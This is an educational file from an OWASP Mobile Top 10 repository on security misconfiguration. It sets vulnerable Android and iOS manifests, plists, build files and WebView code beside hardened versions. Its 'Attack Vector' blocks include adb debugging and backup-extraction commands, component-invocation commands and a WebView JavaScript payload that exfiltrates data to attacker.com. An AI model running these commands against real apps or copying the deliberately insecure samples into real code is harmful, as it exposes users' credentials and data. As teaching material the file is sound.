# M08: Security Misconfiguration - Examples

## Table of Contents
- [Vulnerable Examples](#vulnerable-examples)
- [Secure Examples](#secure-examples)
- [Configuration Comparisons](#configuration-comparisons)
- [Platform-Specific Examples](#platform-specific-examples)
- [Real-World Scenarios](#real-world-scenarios)

## Vulnerable Examples

### ❌ Example 1: Debuggable Production App

**Vulnerable Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.vulnerableapp">
    
    <!-- VULNERABLE: debuggable=true in production -->
    <application
        android:debuggable="true"
        android:allowBackup="true"
        android:label="@string/app_name">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**Why It's Vulnerable**:
- Allows runtime debugging with tools like `jdb`
- Enables memory inspection and manipulation
- Allows attachment of debugging tools without rooting
- Exposes internal app state and data
- Can bypass security checks through debugging

**Attack Vector**:
```bash
# Attacker can attach debugger to running app
adb jdwp  # List debuggable processes
adb forward tcp:8700 jdwp:<PID>
jdb -attach localhost:8700

# Then execute arbitrary code or inspect memory
```

### ❌ Example 2: Excessive Permissions

**Vulnerable Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.overprivileged">
    
    <!-- VULNERABLE: Requesting unnecessary permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <application>
        <!-- Simple calculator app that only needs internet -->
    </application>
</manifest>
```

**Why It's Vulnerable**:
- Violates principle of least privilege
- Increases attack surface
- Privacy concerns for users
- Potential for data exfiltration
- May be rejected by app stores
- Users may refuse installation

### ❌ Example 3: Cleartext Traffic Allowed

**Vulnerable Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.insecurenetwork">
    
    <!-- VULNERABLE: Allowing cleartext HTTP traffic -->
    <application
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config">
    </application>
</manifest>

<!-- res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- VULNERABLE: Permitting cleartext for all domains -->
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- Also dangerous -->
        </trust-anchors>
    </base-config>
</network-security-config>
```

**Why It's Vulnerable**:
- Allows unencrypted HTTP connections
- Susceptible to man-in-the-middle attacks
- Credentials and data sent in plaintext
- Network traffic can be intercepted
- User-installed certificates trusted (allows SSL interception)

**Attack Vector**:
```bash
# Attacker on same network can intercept traffic
mitmproxy -p 8080
# All HTTP traffic visible and modifiable
```

### ❌ Example 4: Exported Components Without Protection

**Vulnerable Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.exposedcomponents">
    
    <application>
        <!-- VULNERABLE: Exported activity without permissions -->
        <activity
            android:name=".AdminActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="com.example.ADMIN_ACTION" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
        
        <!-- VULNERABLE: Exported content provider -->
        <provider
            android:name=".UserDataProvider"
            android:authorities="com.example.provider.userdata"
            android:exported="true"
            android:grantUriPermissions="true" />
        
        <!-- VULNERABLE: Exported broadcast receiver -->
        <receiver
            android:name=".PaymentReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="com.example.PAYMENT_COMPLETE" />
            </intent-filter>
        </receiver>
        
        <!-- VULNERABLE: Exported service -->
        <service
            android:name=".DatabaseService"
            android:exported="true" />
    </application>
</manifest>
```

**Why It's Vulnerable**:
- Any app can invoke exported components
- No authentication or authorization
- Potential for unauthorized data access
- Possible privilege escalation
- Can trigger sensitive operations

**Attack Vector**:
```bash
# Attacker app can invoke admin activity
adb shell am start -n com.example.exposedcomponents/.AdminActivity

# Access content provider data
adb shell content query --uri content://com.example.provider.userdata/users

# Send malicious broadcast
adb shell am broadcast -a com.example.PAYMENT_COMPLETE
```

### ❌ Example 5: Backup Including Sensitive Data

**Vulnerable Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.unsecurebackup">
    
    <!-- VULNERABLE: Backup enabled without exclusion rules -->
    <application
        android:allowBackup="true">
        <!-- No backup rules defined -->
    </application>
</manifest>
```

**Vulnerable Storage Code**:
```java
public class LoginManager {
    public void saveCredentials(String username, String password) {
        // VULNERABLE: Stored in shared preferences (included in backups)
        SharedPreferences prefs = context.getSharedPreferences("user_prefs", MODE_PRIVATE);
        prefs.edit()
            .putString("username", username)
            .putString("password", password)  // Plaintext password in backup!
            .putString("api_token", apiToken)
            .apply();
    }
}
```

**Why It's Vulnerable**:
- Sensitive data included in Android backups
- Accessible via `adb backup`
- Restored to different devices
- No encryption for backup data
- Accessible on compromised Google accounts

**Attack Vector**:
```bash
# Extract backup with sensitive data
adb backup -f backup.ab -noapk com.example.unsecurebackup
# Convert and extract
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar -xvf backup.tar
# Access shared_prefs/user_prefs.xml with passwords
```

### ❌ Example 6: Weak WebView Configuration

**Vulnerable Code (Android - Java)**:
```java
public class VulnerableWebViewActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        WebView webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        
        // VULNERABLE: Dangerous WebView configuration
        settings.setJavaScriptEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccessFromFileURLs(true);
        settings.setAllowUniversalAccessFromFileURLs(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        
        // VULNERABLE: JavaScript interface exposed
        webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
        
        // VULNERABLE: Loading untrusted content
        String userUrl = getIntent().getStringExtra("url");
        webView.loadUrl(userUrl);  // No URL validation!
        
        // VULNERABLE: Debugging enabled
        WebView.setWebContentsDebuggingEnabled(true);
        
        setContentView(webView);
    }
    
    // VULNERABLE: Exposed interface
    public class JavaScriptInterface {
        @JavascriptInterface
        public String getSensitiveData() {
            return readSensitiveData();  // Accessible from JavaScript!
        }
    }
}
```

**Why It's Vulnerable**:
- JavaScript can access local files
- Cross-site scripting (XSS) attacks possible
- Arbitrary file read/write
- JavaScript interface exposes native functions
- No URL validation
- Chrome DevTools can inspect WebView

**Attack Vector**:
```javascript
// Malicious website loaded in WebView
<script>
  // Access native interface
  var data = Android.getSensitiveData();
  
  // Read local files
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'file:///data/data/com.example.app/shared_prefs/secrets.xml');
  xhr.send();
  
  // Exfiltrate data
  fetch('https://attacker.com/steal?data=' + data);
</script>
```

### ❌ Example 7: iOS Insecure App Transport Security

**Vulnerable Code (iOS - Info.plist)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- VULNERABLE: Disabling App Transport Security -->
    <key>NSAppTransportSecurity</key>
    <dict>
        <!-- DANGEROUS: Allows all insecure connections -->
        <key>NSAllowsArbitraryLoads</key>
        <true/>
        
        <!-- DANGEROUS: Also disabled for web views -->
        <key>NSAllowsArbitraryLoadsInWebContent</key>
        <true/>
        
        <!-- DANGEROUS: Allows local networking without TLS -->
        <key>NSAllowsLocalNetworking</key>
        <true/>
    </dict>
    
    <!-- VULNERABLE: Overly permissive permissions -->
    <key>NSPhotoLibraryUsageDescription</key>
    <string>We need access</string>
    <key>NSCameraUsageDescription</key>
    <string>We need access</string>
    <key>NSMicrophoneUsageDescription</key>
    <string>We need access</string>
    <key>NSLocationWhenInUseUsageDescription</key>
    <string>We need access</string>
    <key>NSLocationAlwaysUsageDescription</key>
    <string>We need access</string>
    <key>NSContactsUsageDescription</key>
    <string>We need access</string>
</dict>
</plist>
```

**Why It's Vulnerable**:
- Allows HTTP connections (no encryption)
- Man-in-the-middle attacks possible
- Weak TLS versions accepted
- No certificate validation
- Vague permission descriptions (may be rejected)

### ❌ Example 8: Missing ProGuard Configuration

**Vulnerable Code (Android - build.gradle)**:
```gradle
android {
    buildTypes {
        release {
            // VULNERABLE: ProGuard disabled
            minifyEnabled false
            shrinkResources false
            
            // No obfuscation
            // debuggable false  // Commented out!
        }
    }
}
```

**Why It's Vulnerable**:
- Easy to reverse engineer
- Class and method names readable
- String literals visible
- Debug information present
- Larger APK size
- Security through obscurity reduced

## Secure Examples

### ✅ Example 1: Secure Android Manifest

**Secure Code (Android - AndroidManifest.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.secureapp">
    
    <!-- ✅ GOOD: Request only necessary permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.CAMERA" />
    
    <application
        android:name=".SecureApplication"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        
        <!-- ✅ GOOD: Security settings -->
        android:debuggable="false"
        android:allowBackup="true"
        android:fullBackupContent="@xml/backup_rules"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:usesCleartextTraffic="false"
        android:networkSecurityConfig="@xml/network_security_config"
        android:requestLegacyExternalStorage="false">
        
        <!-- ✅ GOOD: Not exported by default -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- ✅ GOOD: Internal activity not exported -->
        <activity
            android:name=".ProfileActivity"
            android:exported="false" />
        
        <!-- ✅ GOOD: Protected content provider -->
        <provider
            android:name=".SecureDataProvider"
            android:authorities="com.example.secureapp.provider"
            android:exported="false"
            android:grantUriPermissions="false" />
    </application>
</manifest>
```

**Secure Backup Configuration (res/xml/backup_rules.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<full-backup-content>
    <!-- ✅ GOOD: Include only safe data -->
    <include domain="sharedpref" path="app_preferences.xml"/>
    <include domain="file" path="cache/"/>
    
    <!-- ✅ GOOD: Exclude sensitive data -->
    <exclude domain="sharedpref" path="secure_prefs.xml"/>
    <exclude domain="sharedpref" path="encrypted_prefs.xml"/>
    <exclude domain="database" path="credentials.db"/>
    <exclude domain="file" path="keys/"/>
    <exclude domain="file" path="tokens/"/>
</full-backup-content>
```

**Secure Network Configuration (res/xml/network_security_config.xml)**:
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- ✅ GOOD: Block cleartext by default -->
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <!-- Only trust system certificates -->
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    
    <!-- ✅ GOOD: Certificate pinning for API -->
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2025-12-31">
            <pin digest="SHA-256">primaryCertificateHash==</pin>
            <pin digest="SHA-256">backupCertificateHash==</pin>
        </pin-set>
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </domain-config>
    
    <!-- ✅ GOOD: Debug overrides (only active in debug builds) -->
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
            <certificates src="system" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

### ✅ Example 2: Secure Build Configuration

**Secure Code (Android - build.gradle)**:
```gradle
android {
    compileSdkVersion 34
    
    defaultConfig {
        applicationId "com.example.secureapp"
        minSdkVersion 26
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
        
        // ✅ GOOD: Specify supported architectures
        ndk {
            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
        }
    }
    
    signingConfigs {
        release {
            // ✅ GOOD: Use secure signing (keys from environment)
            storeFile file(System.getenv("KEYSTORE_FILE") ?: "release.keystore")
            storePassword System.getenv("KEYSTORE_PASSWORD")
            keyAlias System.getenv("KEY_ALIAS")
            keyPassword System.getenv("KEY_PASSWORD")
        }
    }
    
    buildTypes {
        debug {
            debuggable true
            minifyEnabled false
            applicationIdSuffix '.debug'
            versionNameSuffix '-DEBUG'
        }
        
        release {
            // ✅ GOOD: Production hardening
            debuggable false
            minifyEnabled true
            shrinkResources true
            
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'),
                         'proguard-rules.pro'
            
            signingConfig signingConfigs.release
            
            // ✅ GOOD: Enable additional optimizations
            crunchPngs true
            
            // ✅ GOOD: Remove unused resources
            resValue "string", "build_type", "release"
        }
    }
    
    // ✅ GOOD: Disable development features in release
    buildFeatures {
        viewBinding true
        buildConfig true
    }
    
    packagingOptions {
        // ✅ GOOD: Exclude unnecessary files
        exclude 'META-INF/DEPENDENCIES'
        exclude 'META-INF/LICENSE'
        exclude 'META-INF/LICENSE.txt'
        exclude 'META-INF/NOTICE'
        exclude 'META-INF/NOTICE.txt'
    }
}

dependencies {
    // ✅ GOOD: Use latest security libraries
    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
    
    // ✅ GOOD: Debug tools only in debug builds
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
    debugImplementation 'com.facebook.stetho:stetho:1.6.0'
}
```

**Secure ProGuard Rules (proguard-rules.pro)**:
```proguard
# ✅ GOOD: Comprehensive ProGuard configuration

# Optimization passes
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

# Preserve stack traces for crash reporting
-keepattributes SourceFile,LineNumberTable
-renamesourcefileattribute SourceFile

# Remove all logging
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
    public static *** wtf(...);
}

# Remove debug classes completely
-assumenosideeffects class com.example.app.debug.** {
    *;
}

# Obfuscate but keep crash reporting functional
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes Exception

# Keep models for serialization
-keep class com.example.app.models.** { *; }
-keepclassmembers class com.example.app.models.** { *; }

# Aggressive string encryption
-adaptclassstrings
-adaptresourcefilenames
-adaptresourcefilecontents

# Remove unused code
-dontwarn **
-ignorewarnings
```

### ✅ Example 3: Secure iOS Configuration

**Secure Code (iOS - Info.plist)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- ✅ GOOD: Strict App Transport Security -->
    <key>NSAppTransportSecurity</key>
    <dict>
        <!-- Deny arbitrary loads -->
        <key>NSAllowsArbitraryLoads</key>
        <false/>
        
        <!-- Exception for specific trusted domain -->
        <key>NSExceptionDomains</key>
        <dict>
            <key>api.example.com</key>
            <dict>
                <key>NSExceptionRequiresForwardSecrecy</key>
                <true/>
                <key>NSExceptionMinimumTLSVersion</key>
                <string>TLSv1.3</string>
                <key>NSIncludesSubdomains</key>
                <true/>
                <key>NSRequiresCertificateTransparency</key>
                <true/>
            </dict>
        </dict>
    </dict>
    
    <!-- ✅ GOOD: Specific permission descriptions -->
    <key>NSCameraUsageDescription</key>
    <string>This app requires camera access to scan QR codes for secure authentication</string>
    
    <key>NSPhotoLibraryUsageDescription</key>
    <string>This app needs access to your photo library to allow you to select profile pictures</string>
    
    <!-- ✅ GOOD: Data protection -->
    <key>NSFileProtectionComplete</key>
    <true/>
    
    <!-- ✅ GOOD: Prevent backup of sensitive data -->
    <key>UIFileSharingEnabled</key>
    <false/>
    
    <key>LSSupportsOpeningDocumentsInPlace</key>
    <false/>
    
    <!-- ✅ GOOD: Disable features not needed -->
    <key>UIApplicationExitsOnSuspend</key>
    <false/>
</dict>
</plist>
```

**Secure iOS Build Settings (Build Configuration)**:
```swift
// ✅ GOOD: Conditional compilation for debug features
#if DEBUG
import os.log

class Logger {
    static let enabled = true
    static func log(_ message: String) {
        os_log("%{public}@", log: .default, type: .debug, message)
    }
}
#else
class Logger {
    static let enabled = false
    static func log(_ message: String) {
        // No logging in production
    }
}
#endif

// ✅ GOOD: Anti-debugging protection
class SecurityManager {
    static func checkDebugger() {
        #if !DEBUG
        var info = kinfo_proc()
        var size = MemoryLayout<kinfo_proc>.stride
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        
        let result = sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0)
        
        if result == 0 && (info.kp_proc.p_flag & P_TRACED) != 0 {
            // Debugger detected in production - exit
            exit(0)
        }
        #endif
    }
}
```

### ✅ Example 4: Secure WebView Configuration

**Secure Code (Android - Java)**:
```java
public class SecureWebViewActivity extends AppCompatActivity {
    private static final List<String> ALLOWED_DOMAINS = Arrays.asList(
        "https://www.example.com",
        "https://trusted.example.com"
    );
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        WebView webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        
        // ✅ GOOD: Minimal permissions
        settings.setJavaScriptEnabled(true);  // Only if necessary
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        settings.setAllowFileAccessFromFileURLs(false);
        settings.setAllowUniversalAccessFromFileURLs(false);
        
        // ✅ GOOD: Disable storage
        settings.setDomStorageEnabled(false);
        settings.setDatabaseEnabled(false);
        settings.setSavePassword(false);
        settings.setSaveFormData(false);
        
        // ✅ GOOD: Security features
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            settings.setSafeBrowsingEnabled(true);
        }
        
        // ✅ GOOD: Disable debugging in production
        if (!BuildConfig.DEBUG) {
            WebView.setWebContentsDebuggingEnabled(false);
        }
        
        // ✅ GOOD: Set secure WebViewClient
        webView.setWebViewClient(new SecureWebViewClient());
        
        // ✅ GOOD: Validate URL before loading
        String url = getIntent().getStringExtra("url");
        if (isUrlAllowed(url)) {
            webView.loadUrl(url);
        } else {
            showError("Invalid URL");
            finish();
        }
        
        setContentView(webView);
    }
    
    // ✅ GOOD: URL validation
    private boolean isUrlAllowed(String url) {
        if (url == null || url.isEmpty()) {
            return false;
        }
        
        try {
            URL urlObj = new URL(url);
            String protocol = urlObj.getProtocol();
            
            // Only allow HTTPS
            if (!"https".equals(protocol)) {
                return false;
            }
            
            // Check against whitelist
            for (String allowed : ALLOWED_DOMAINS) {
                if (url.startsWith(allowed)) {
                    return true;
                }
            }
        } catch (MalformedURLException e) {
            return false;
        }
        
        return false;
    }
    
    // ✅ GOOD: Secure WebViewClient
    private class SecureWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            String url = request.getUrl().toString();
            
            if (isUrlAllowed(url)) {
                return false;  // Allow loading
            }
            
            // Block unauthorized URLs
            return true;
        }
        
        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            // ✅ GOOD: Don't ignore SSL errors
            handler.cancel();
            showError("SSL Error: Connection not secure");
        }
    }
}
```

**Secure Code (iOS - Swift)**:
```swift
import WebKit

class SecureWebViewController: UIViewController, WKNavigationDelegate {
    private let allowedDomains = ["https://www.example.com", "https://trusted.example.com"]
    private var webView: WKWebView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // ✅ GOOD: Secure WebView configuration
        let config = WKWebViewConfiguration()
        let prefs = WKWebpagePreferences()
        
        // Disable JavaScript if not needed
        prefs.allowsContentJavaScript = true  // Only if required
        config.defaultWebpagePreferences = prefs
        
        // ✅ GOOD: Disable inline media
        config.allowsInlineMediaPlayback = false
        config.mediaTypesRequiringUserActionForPlayback = .all
        
        // ✅ GOOD: Minimize data detectors
        config.dataDetectorTypes = []
        
        // ✅ GOOD: Disable AirPlay
        config.allowsAirPlayForMediaPlayback = false
        
        webView = WKWebView(frame: .zero, configuration: config)
        webView.navigationDelegate = self
        
        // ✅ GOOD: Disable features
        webView.allowsBackForwardNavigationGestures = false
        webView.allowsLinkPreview = false
        
        view.addSubview(webView)
        
        // Load validated URL
        if let urlString = validatedURL,
           let url = URL(string: urlString) {
            webView.load(URLRequest(url: url))
        }
    }
    
    // ✅ GOOD: Validate navigation
    func webView(_ webView: WKWebView, 
                decidePolicyFor navigationAction: WKNavigationAction,
                decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        
        guard let url = navigationAction.request.url else {
            decisionHandler(.cancel)
            return
        }
        
        if isURLAllowed(url) {
            decisionHandler(.allow)
        } else {
            decisionHandler(.cancel)
            showError("Unauthorized URL")
        }
    }
    
    // ✅ GOOD: URL whitelist validation
    private func isURLAllowed(_ url: URL) -> Bool {
        guard let scheme = url.scheme, scheme == "https" else {
            return false
        }
        
        let urlString = url.absoluteString
        return allowedDomains.contains { urlString.hasPrefix($0) }
    }
    
    // ✅ GOOD: Handle SSL errors
    func webView(_ webView: WKWebView,
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        
        // Don't ignore certificate errors
        completionHandler(.performDefaultHandling, nil)
    }
}
```

### ✅ Example 5: Secure Permission Handling

**Secure Code (Android - Kotlin)**:
```kotlin
class SecurePermissionManager(private val activity: AppCompatActivity) {
    
    // ✅ GOOD: Request permission with context
    fun requestCameraPermission(onGranted: () -> Unit, onDenied: () -> Unit) {
        when {
            ContextCompat.checkSelfPermission(
                activity,
                Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED -> {
                onGranted()
            }
            
            ActivityCompat.shouldShowRequestPermissionRationale(
                activity,
                Manifest.permission.CAMERA
            ) -> {
                // ✅ GOOD: Show detailed rationale
                showPermissionRationale(
                    title = "Camera Permission Required",
                    message = "This app needs camera access to scan QR codes for authentication. " +
                             "Your privacy is protected - images are processed locally and never stored.",
                    onContinue = {
                        requestPermission(Manifest.permission.CAMERA, onGranted, onDenied)
                    },
                    onCancel = onDenied
                )
            }
            
            else -> {
                requestPermission(Manifest.permission.CAMERA, onGranted, onDenied)
            }
        }
    }
    
    private fun requestPermission(
        permission: String,
        onGranted: () -> Unit,
        onDenied: () -> Unit
    ) {
        val launcher = activity.registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { isGranted ->
            if (isGranted) {
                onGranted()
            } else {
                onDenied()
            }
        }
        launcher.launch(permission)
    }
    
    // ✅ GOOD: Guide to settings if permanently denied
    private fun showPermissionRationale(
        title: String,
        message: String,
        onContinue: () -> Unit,
        onCancel: () -> Unit
    ) {
        MaterialAlertDialogBuilder(activity)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Continue") { _, _ -> onContinue() }
            .setNegativeButton("Cancel") { _, _ -> onCancel() }
            .show()
    }
}
```

## Configuration Comparisons

### Android Manifest: Vulnerable vs Secure

| Configuration | ❌ Vulnerable | ✅ Secure |
|--------------|--------------|----------|
| **debuggable** | `true` | `false` |
| **allowBackup** | `true` (no rules) | `true` with exclusion rules |
| **usesCleartextTraffic** | `true` | `false` |
| **exported** (activities) | `true` (unnecessary) | `false` (unless needed) |
| **permissions** | All requested upfront | Minimal, runtime requests |
| **networkSecurityConfig** | Not set | Configured with pinning |
| **WebView debugging** | Enabled | Disabled in production |
| **dataExtractionRules** | Not set | Configured (Android 12+) |

### iOS Info.plist: Vulnerable vs Secure

| Configuration | ❌ Vulnerable | ✅ Secure |
|--------------|--------------|----------|
| **NSAllowsArbitraryLoads** | `true` | `false` |
| **TLS Version** | TLSv1.0 | TLSv1.3 |
| **Permission Descriptions** | Vague | Specific and clear |
| **UIFileSharingEnabled** | `true` | `false` |
| **Data Protection** | Not set | Complete protection |
| **Certificate Transparency** | Not required | Required |

### Build Configuration: Vulnerable vs Secure

| Aspect | ❌ Vulnerable | ✅ Secure |
|--------|--------------|----------|
| **ProGuard/R8** | Disabled | Enabled with rules |
| **Debugging** | Enabled | Disabled in release |
| **Logging** | Verbose | Removed in production |
| **Code Optimization** | None | Maximum |
| **Resource Shrinking** | Disabled | Enabled |
| **Signing** | Debug key | Release key (secure) |
| **Obfuscation** | None | Aggressive |

## Platform-Specific Examples

### Android: Content Provider Security

**❌ Vulnerable**:
```xml
<provider
    android:name=".DataProvider"
    android:authorities="com.example.provider"
    android:exported="true"
    android:grantUriPermissions="true" />
```

**✅ Secure**:
```xml
<provider
    android:name=".DataProvider"
    android:authorities="com.example.provider"
    android:exported="false"
    android:grantUriPermissions="false"
    android:readPermission="com.example.permission.READ_DATA"
    android:writePermission="com.example.permission.WRITE_DATA">
</provider>

<!-- Define custom permissions -->
<permission
    android:name="com.example.permission.READ_DATA"
    android:protectionLevel="signature" />
<permission
    android:name="com.example.permission.WRITE_DATA"
    android:protectionLevel="signature" />
```

### iOS: Keychain Data Protection

**❌ Vulnerable**:
```swift
// No data protection
UserDefaults.standard.set(sensitiveToken, forKey: "token")
```

**✅ Secure**:
```swift
// ✅ GOOD: Use Keychain with appropriate protection
func storeToken(_ token: String) -> Bool {
    guard let data = token.data(using: .utf8) else { return false }
    
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "auth_token",
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    
    SecItemDelete(query as CFDictionary)
    let status = SecItemAdd(query as CFDictionary, nil)
    return status == errSecSuccess
}
```

## Real-World Scenarios

### Scenario 1: Banking App Configuration

**Requirements**:
- Maximum security
- No screenshots allowed
- Certificate pinning
- Biometric authentication
- No backups

**Implementation (Android)**:
```xml
<!-- AndroidManifest.xml -->
<application
    android:allowBackup="false"
    android:usesCleartextTraffic="false"
    android:networkSecurityConfig="@xml/network_security_config">
    
    <activity
        android:name=".BankingActivity"
        android:exported="false"
        android:windowSoftInputMode="stateAlwaysHidden">
        
        <!-- Prevent screenshots -->
        <meta-data
            android:name="android.app.secure_window"
            android:value="true" />
    </activity>
</application>
```

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    // Prevent screenshots
    getWindow().setFlags(
        WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE
    );
    
    // Require biometric
    showBiometricPrompt();
}
```

### Scenario 2: Healthcare App (HIPAA Compliance)

**Requirements**:
- Encrypted storage
- Audit logging
- Data protection
- Minimal permissions

**Implementation (iOS)**:
```swift
// ✅ GOOD: HIPAA-compliant storage
class SecureHealthDataManager {
    func storePatientData(_ data: PatientData) throws {
        let jsonData = try JSONEncoder().encode(data)
        
        // Store with complete protection
        let fileURL = getSecureURL()
        try jsonData.write(to: fileURL, options: .completeFileProtection)
        
        // Exclude from backup
        var resourceValues = URLResourceValues()
        resourceValues.isExcludedFromBackup = true
        try fileURL.setResourceValues(resourceValues)
        
        // Audit log
        auditLog("Patient data stored securely")
    }
}
```

---

**Key Takeaway**: Security configurations must be environment-specific and regularly audited. What's acceptable in development is often dangerous in production.

*Part of OWASP Mobile Top 10 - Educational Repository*
